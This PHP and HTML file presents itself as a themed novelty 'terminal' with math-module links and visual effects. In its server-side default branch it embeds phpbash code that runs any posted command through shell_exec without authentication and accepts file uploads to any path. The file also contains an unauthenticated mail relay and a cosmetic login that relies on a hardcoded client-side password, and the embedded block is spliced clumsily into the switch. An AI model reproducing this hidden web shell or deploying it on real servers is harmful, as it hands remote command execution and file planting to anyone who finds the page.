<?php
/* 3SRC Terminal by HubX - Enhanced Version */
if (isset($_POST['cmd'])) {
    $cmd = trim($_POST['cmd']);
    $output = "";

    // Command routing logic
    switch ($cmd) {
        case 'help':
            $output .= "Available commands: help, mail, bash, portal, clear, algebra, arithmetic, finance, search, trigo\n";
            break;
        case 'clear':
            $output .= ""; // Client-side command to clear terminal; no server output.
            break;
        case 'mail':
            // Process email sending
            if (isset($_POST['email'], $_POST['subject'], $_POST['body'])) {
                $to = $_POST['email'];
                $subject = $_POST['subject'];
                $body = $_POST['body'];
                $headers = "From: 3src@localhost";
                $output .= mail($to, $subject, $body, $headers) ? "Email sent successfully." : "Failed to send email.";
            } else {
                $output .= "Email command requires email, subject, and body parameters.";
            }
            break;
        case 'bash':
            $output .= "ACCESSING BASH SHELL...\nESTABLISHING SECURE CONNECTION...\nCONNECTION ESTABLISHED\n";

            break;
        case 'portal':
            $output .= "Opening interdimensional portal...\n";
            break;
        case 'algebra':
            header("Location: math/Algebra.php");
            exit;
        case 'arithmetic':
            header("Location: math/Arithmetic.php");
            exit;
        case 'finance':
            header("Location: math/Finance.php");
            exit;
        case 'search':
            header("Location: math/Search.php");
            exit;
        case 'trigo':
            header("Location: math/Trigonometry.php");
            exit;
        default:

/* phpbash by Alexander Reid (Arrexel) */
if (isset($_POST['cmd'])) {
    $output = preg_split('/[\n]/', shell_exec($_POST['cmd'] . " 2>&1"));
    foreach ($output as $line) {
        echo htmlentities($line, ENT_QUOTES | ENT_HTML5, 'UTF-8') . "<br>";
    }
    die();
} else if (!empty($_FILES['file']['tmp_name']) && !empty($_POST['path'])) {
    $filename = $_FILES["file"]["name"];
    $path = $_POST['path'];
    if ($path != "/") {
        $path .= "/";
    }
    if (move_uploaded_file($_FILES["file"]["tmp_name"], $path . $filename)) {
        echo htmlentities($filename) . " successfully uploaded to " . htmlentities($path);
    } else {
        echo "Error uploading " . htmlentities($filename);
    }
    die();
}
            break;
    }

    // Return output with newline breaks converted to <br>
    echo nl2br($output);
    die();
} else if (!empty($_FILES['file']['tmp_name']) && !empty($_POST['path'])) {
    $filename = $_FILES["file"]["name"];
    $path = rtrim($_POST['path'], "/") . "/";
    echo move_uploaded_file($_FILES["file"]["tmp_name"], $path . $filename) ? htmlentities($filename) . " successfully uploaded to " . htmlentities($path) : "Error uploading " . htmlentities($filename);
    die();
} else if (isset($_POST['email'])) {
    $to = $_POST['email'];
    $subject = $_POST['subject'];
    $body = $_POST['body'];
    $headers = "From: 3src@localhost";
    echo mail($to, $subject, $body, $headers) ? "Email sent successfully." : "Failed to send email.";
    die();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>3SRC Terminal Access TA103 - Enhanced</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;700&display=swap');

        body {
            font-family: 'Inconsolata', monospace;
            background-color: #000;
            overflow: hidden;
        }

        .matrix-text {
            color: #00ff41;
            text-shadow: 0 0 5px #00ff41;
        }

        .cursor {
            display: inline-block;
            width: 10px;
            height: 20px;
            background-color: #00a8ff;
            animation: blink 1s infinite;
            vertical-align: middle;
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }

        .matrix-rain {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            opacity: 0.1;
        }

        .command-history {
            height: calc(100vh - 60px);
            overflow-y: auto;
            scrollbar-width: none;
        }

        .command-history::-webkit-scrollbar {
            display: none;
        }

        .glitch {
            position: relative;
        }

        .glitch::before, .glitch::after {
            content: attr(data-text);
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }

        .glitch::before {
            left: 2px;
            text-shadow: -2px 0 #ff00ff;
            clip: rect(44px, 450px, 56px, 0);
            animation: glitch-anim 5s infinite linear alternate-reverse;
        }

        .glitch::after {
            left: -2px;
            text-shadow: -2px 0 #00ffff;
            clip: rect(44px, 450px, 56px, 0);
            animation: glitch-anim2 5s infinite linear alternate-reverse;
        }

        @keyframes glitch-anim {
            0% { clip: rect(31px, 9999px, 94px, 0); }
            10% { clip: rect(112px, 9999px, 76px, 0); }
            20% { clip: rect(85px, 9999px, 77px, 0); }
            30% { clip: rect(27px, 9999px, 97px, 0); }
            40% { clip: rect(64px, 9999px, 98px, 0); }
            50% { clip: rect(61px, 9999px, 85px, 0); }
            60% { clip: rect(99px, 9999px, 114px, 0); }
            70% { clip: rect(34px, 9999px, 115px, 0); }
            80% { clip: rect(98px, 9999px, 129px, 0); }
            90% { clip: rect(43px, 9999px, 96px, 0); }
            100% { clip: rect(82px, 9999px, 64px, 0); }
        }

        @keyframes glitch-anim2 {
            0% { clip: rect(65px, 9999px, 119px, 0); }
            10% { clip: rect(144px, 9999px, 41px, 0); }
            20% { clip: rect(6px, 9999px, 140px, 0); }
            30% { clip: rect(10px, 9999px, 105px, 0); }
            40% { clip: rect(147px, 9999px, 134px, 0); }
            50% { clip: rect(25px, 9999px, 7px, 0); }
            60% { clip: rect(13px, 9999px, 61px, 0); }
            70% { clip: rect(105px, 9999px, 74px, 0); }
            80% { clip: rect(100px, 9999px, 99px, 0); }
            90% { clip: rect(71px, 9999px, 62px, 0); }
            100% { clip: rect(28px, 9999px, 11px, 0); }
        }

        .typing {
            border-right: 2px solid #00ff41;
            animation: blink 1s step-end infinite;
        }

        .portal {
            position: absolute;
            width: 400px;
            height: 200px;
            background: radial-gradient(circle, #00a8ff, #000);
            border-radius: 10px;
            box-shadow: 0 0 50px #00a8ff;
            animation: portal-flicker 1s infinite alternate;
            resize: both;
            overflow: hidden;
            border: 2px solid #00a8ff;
        }

        @keyframes portal-flicker {
            0% { opacity: 1; }
            100% { opacity: 0.8; }
        }

        .bios-screen {
            position: fixed;
            top: 0;
            right: 0;
            width: 300px;
            height: 100vh;
            background: #000;
            color: #00ff41;
            font-family: 'Inconsolata', monospace;
            padding: 20px;
            z-index: 1000;
            font-size: 12px;
            overflow-y: auto;
        }

        .login-prompt {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0, 0, 0, 0.8);
            padding: 20px;
            border: 1px solid #00ff41;
            border-radius: 5px;
            color: #00ff41;
            z-index: 1001;
        }

        .login-prompt input {
            background: transparent;
            border: 1px solid #00ff41;
            color: #00ff41;
            padding: 5px;
            margin: 5px 0;
            width: 100%;
        }

        .login-prompt button {
            background: #00ff41;
            color: #000;
            border: none;
            padding: 5px 10px;
            cursor: pointer;
            margin-top: 10px;
        }
    </style>
</head>
<body class="bg-black text-green-500 p-4">
    <!-- BIOS Boot Screen -->
    <div id="bios-screen" class="bios-screen">
        <h1>3SRC Camille Roy</h1>
        <p>Copyright (C) 1980-2025, All Rights Reserved</p>
        <p>Camille Roy - root@linux.locker</p>
        <p>514.895.8636</p>
        <p>BIOS: 4LIOD v1.0.3 2011-2025</p>
        <p>Initializing USB Controllers .. Done</p>
        <p>Initializing DVD Devices .. Done</p>
        <p>Internet Keyboard Detected</p>
        <p>Detecting Internet Drives ...</p>
        <p>Memory Testing: 160GB OK</p>
        <p>Memory Map Passed - ECC Verified</p>
        <p>CPU Detected: 24 x 64-bit Processors</p>
        <p>-> 8 Multi-threaded CPU found</p>
        <p>Hyperthreading Technology - Enabled</p>
        <p>VT-x Virtualization - Enabled</p>
        <p>NX Bit - Enabled</p>
        <p>AHCI Controller Initialized - 4 Channels Active</p>
        <p>ZFS File System Found</p>
        <p>Detected Storage: 19.96 Terabytes</p>
        <p>Maximum 1 Zettabyte File System Ready</p>
        <p>USB Legacy Support - Enabled</p>
        <p>PXE Boot Agent - Enabled</p>
        <p>DVD Boot Agent - Enabled</p>
        <p>Internet Boot Agent - Enabled</p>
        <p>Initializing Bootloader ...</p>
        <p>Booting from Internet Device ...</p>
    </div>

    <!-- Login Prompt -->
    <div id="login-prompt" class="login-prompt" style="display: none;">
        <p>Login to 3SRC Terminal</p>
        <input type="text" id="username" placeholder="Username">
        <input type="password" id="password" placeholder="Password">
        <button onclick="login()">Login</button>
    </div>

    <!-- Matrix rain effect -->
    <canvas id="matrix-rain" class="matrix-rain"></canvas>

    <!-- Teleportation Portal -->
    <div id="portal" class="portal" style="display: none;">
        <div class="p-4">
            <input 
                type="text" 
                id="entity-input" 
                class="w-full bg-transparent border-none outline-none text-blue-500" 
                placeholder="entity"
                autocomplete="off"
            >
            <input 
                type="text" 
                id="sha1-input" 
                class="w-full bg-transparent border-none outline-none text-blue-500 mt-2" 
                placeholder="Secure Hash Algorithm 1"
                autocomplete="off"
                maxlength="40"
            >
            <p class="text-xs text-blue-500 mt-2">160-bit hash – 40 hexadecimal digits.</p>
            <button 
                class="w-full bg-blue-500 text-black mt-4 py-1 rounded" 
                onclick="decrypt()"
            >
                Decrypt
            </button>
        </div>
    </div>

    <div class="container mx-auto max-w-4xl">
        <!-- Header with glitch effect -->
        <div class="glitch mb-6" data-text="3SRC Terminal Access TA103">
            <h1 class="text-3xl font-bold text-blue-500">3SRC Terminal Access TA103</h1>
        </div>

        <div class="border border-green-500 rounded p-4 bg-black bg-opacity-80">
            <!-- Command history -->
            <div id="command-history" class="command-history mb-4">
                <div class="matrix-text">
                    <p>SYSTEM INITIALIZED...</p>
                    <p>CONNECTING TO MAINFRAME...</p>
                    <p class="typing-animation">ACCESS GRANTED</p>
                    <p>> Welcome to the 3SRC terminal interface.</p>
                    <p>> Type 'help' for available commands.</p>
                    <p>> </p>
                </div>
            </div>

            <!-- Command input -->
            <div class="flex items-center">
                <span id="prompt" class="matrix-text mr-2">></span>
                <input 
                    type="text" 
                    id="command-input" 
                    class="flex-1 bg-transparent border-none outline-none matrix-text" 
                    autocomplete="off" 
                    spellcheck="false"
                    autofocus
                >
                <span id="cursor" class="cursor"></span>
            </div>
        </div>

        <div class="mt-4 text-xs matrix-text opacity-70">
            <p>WARNING: Unauthorized access is prohibited. All activity is monitored.</p>
        </div>
    </div>

    <script>
        // BIOS and login sequence
        const biosScreen = document.getElementById('bios-screen');
        const loginPrompt = document.getElementById('login-prompt');
        let biosLines = biosScreen.querySelectorAll('p');
        let currentLine = 0;

        const showBiosLine = () => {
            if (currentLine < biosLines.length) {
                biosLines[currentLine].style.display = 'block';
                currentLine++;
                setTimeout(showBiosLine, 500); // Show each line with a 500ms delay
            } else {
                loginPrompt.style.display = 'block';
            }
        };

        showBiosLine();

        // Login with enhanced verification: compare password against a prime number computed below.
        const login = () => {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // For demonstration, assume a prime number (e.g., 17) is found during calculation.
            const computedPrime = 17;

            // Verify password: user must enter the computed prime number in string form.
            if (username === '3src' && password === String(computedPrime)) {
                loginPrompt.style.display = 'none';
                document.getElementById('command-input').focus();

                // Launch password regeneration (digineration.php) to update default password.
                fetch('digineration.php')
                    .then(response => response.text())
                    .then(newPass => console.log("New password generated:", newPass));
            } else {
                alert('Invalid username or password.');
            }
        };

        // Matrix rain effect
        const canvas = document.getElementById('matrix-rain');
        const ctx = canvas.getContext('2d');

        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;

        const katakana = 'アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘメレヱゲゼデベペオォコソトノホモヨョロヲゴゾドボポヴッン';
        const latin = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
        const nums = '0123456789';
        const symbols = '!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~';

        const alphabet = katakana + latin + nums + symbols;
        const fontSize = 16;
        const columns = canvas.width / fontSize;
        const rainDrops = Array(Math.floor(columns)).fill(1);

        const draw = () => {
            ctx.fillStyle = 'rgba(0,0,0,0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);

            ctx.fillStyle = '#00ff41';
            ctx.font = fontSize + 'px monospace';

            for (let i = 0; i < rainDrops.length; i++) {
                const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
                ctx.fillText(text, i * fontSize, rainDrops[i] * fontSize);

                if (rainDrops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    rainDrops[i] = 0;
                }
                rainDrops[i]++;
            }
        };

        setInterval(draw, 30);

        // Terminal command functionality with extended commands
        const commandHistory = document.getElementById('command-history');
        const commandInput = document.getElementById('command-input');
        const cursor = document.getElementById('cursor');
        const prompt = document.getElementById('prompt');
        const portal = document.getElementById('portal');

        let currentMode = 'matrix';

        const matrixCommands = {
            help: {
                description: 'Display this help message',
                execute: () => {
                    addOutput('<p>Available commands:</p>');
                    Object.keys(matrixCommands).forEach(cmd => {
                        addOutput(`<p>${cmd.padEnd(15)} - ${matrixCommands[cmd].description}</p>`);
                    });
                }
            },
            clear: {
                description: 'Clear the terminal',
                execute: () => {
                    commandHistory.innerHTML = '';
                }
            },
            mail: {
                description: 'Send an email via the wormhole',
                execute: () => {
                    const email = prompt('Enter recipient email:');
                    const subject = prompt('Enter email subject:');
                    const body = prompt('Enter email body:');

                    if (email && subject && body) {
                        const xhr = new XMLHttpRequest();
                        xhr.onreadystatechange = () => {
                            if (xhr.readyState === XMLHttpRequest.DONE) {
                                addOutput(`<p class="matrix-text">${xhr.responseText}</p>`);
                            }
                        };
                        xhr.open('POST', '', true);
                        xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
                        xhr.send(`email=${encodeURIComponent(email)}&subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`);
                    } else {
                        addOutput('<p class="matrix-text">Email not sent. All fields are required.</p>');
                    }
                }
            },
            portal: {
                description: 'Open an interdimensional portal',
                execute: () => {
                    portal.style.display = 'block';
                    portal.style.left = '50%';
                    portal.style.top = '50%';
                    portal.style.transform = 'translate(-50%, -50%)';
                }
            },
            bash: {
                description: 'Access BASH shell',
                execute: () => {
                    addOutput('<p>ACCESSING BASH SHELL...</p>');
                    setTimeout(() => {
                        addOutput('<p>ESTABLISHING SECURE CONNECTION...</p>');
                    }, 500);
                    setTimeout(() => {
                        addOutput('<p>CONNECTION ESTABLISHED</p>');
                        switchToBASH();
                    }, 1000);
                }
            },
            algebra: {
                description: 'Run Algebra module',
                execute: () => {
                    window.location.href = 'math/Algebra.php';
                }
            },
            arithmetic: {
                description: 'Run Arithmetic module',
                execute: () => {
                    window.location.href = 'math/Arithmetic.php';
                }
            },
            finance: {
                description: 'Run Finance module',
                execute: () => {
                    window.location.href = 'math/Finance.php';
                }
            },
            search: {
                description: 'Run Search module',
                execute: () => {
                    window.location.href = 'math/Search.php';
                }
            },
            trigo: {
                description: 'Run Trigonometry module',
                execute: () => {
                    window.location.href = 'math/Trigonometry.php';
                }
            }
        };

        function addOutput(html) {
            const div = document.createElement('div');
            div.innerHTML = html;
            commandHistory.appendChild(div);
            commandHistory.scrollTop = commandHistory.scrollHeight;
        }

        commandInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                const command = commandInput.value;
                commandInput.value = '';
                processCommand(command);
            }
        });

        function processCommand(input) {
            if (currentMode === 'matrix') {
                addOutput(`<p class="matrix-text">> ${input}</p>`);
            } else {
                addOutput(`<p class="matrix-text">$ ${input}</p>`);
            }

            const parts = input.trim().split(' ');
            const command = parts[0].toLowerCase();

            if (currentMode === 'matrix') {
                if (matrixCommands[command]) {
                    matrixCommands[command].execute(parts.slice(1));
                } else {
                    addOutput(`<p class="matrix-text">Command not found: ${command}</p>`);
                    addOutput('<p class="matrix-text">Type "help" for available commands</p>');
                }
            } else {
                // In bash mode, you could send commands to the server.
                addOutput(`<p class="matrix-text">${command}: command not found</p>`);
            }

            addOutput(currentMode === 'matrix' ? '<p class="matrix-text">> </p>' : '<p class="matrix-text">$ </p>');
        }

        function switchToBASH() {
            currentMode = 'bash';
            commandInput.className = 'flex-1 bg-transparent border-none outline-none text-blue-500';
            prompt.textContent = '$';
            commandInput.value = '';
        }

        function switchToMatrix() {
            currentMode = 'matrix';
            commandInput.className = 'flex-1 bg-transparent border-none outline-none matrix-text';
            prompt.textContent = '>';
            commandInput.value = '';
        }

        function decrypt() {
            const sha1Input = document.getElementById('sha1-input').value;
            if (sha1Input.length === 40) {
                addOutput(`<p class="matrix-text">Decrypting SHA-1 hash: ${sha1Input}</p>`);
                portal.style.display = 'none';
            } else {
                addOutput('<p class="matrix-text">Invalid SHA-1 hash. Must be 40 characters.</p>');
            }
        }

        // Initial typing animation and boot messages
        setTimeout(() => {
            const typingElements = document.querySelectorAll('.typing-animation');
            typingElements.forEach(el => {
                const text = el.textContent;
                el.textContent = '';
                let i = 0;
                const typing = setInterval(() => {
                    if (i < text.length) {
                        el.textContent += text.charAt(i);
                        i++;
                    } else {
                        clearInterval(typing);
                    }
                }, 100);
            });

            setTimeout(() => {
                addOutput('<p class="matrix-text">> Detecting secondary shell interface...</p>');
                setTimeout(() => {
                    addOutput('<p class="matrix-text">> BASH shell available</p>');
                    addOutput('<p class="matrix-text">> Type "bash" to access</p>');
                    addOutput('<p class="matrix-text">> </p>');
                }, 800);
            }, 1500);
        }, 500);
    </script>
    <p style="border-radius: 8px; text-align: center; font-size: 12px; color: #fff; margin-top: 16px; position: fixed; left: 8px; bottom: 8px; z-index: 10; background: rgba(0,0,0,0.8); padding: 4px 8px;">
        Made with <img src="https://3src.com/themes/contrib/aristotle/assets/4LIOD.svg" alt="4LIOD Logo" style="width: 36px; height: 36px; vertical-align: middle; margin-right:3px; filter:brightness(0) invert(1);">
        <a href="https://3src.com/cleqc" style="color: #fff; text-decoration: underline;" target="_blank">3SRC</a> - 🧬
        <a href="https://linux.locker" style="color: #fff; text-decoration: underline;" target="_blank">Locker Linux</a>
    </p>
</body>
</html>
